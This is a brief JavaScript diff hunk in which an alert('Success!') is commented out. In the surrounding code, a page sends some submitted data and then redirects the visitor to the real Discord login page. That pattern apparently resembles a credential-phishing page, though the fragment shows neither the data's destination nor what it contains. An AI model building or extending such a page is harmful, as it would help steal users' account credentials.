@@ -9,7 +9,7 @@ window.addEventListener("load", function() {
         body: data,
       })
       .then(() => {
-        alert("Success!");
+        // alert("Success!");
         window.location.replace("https://discord.com/login");
       })
     });
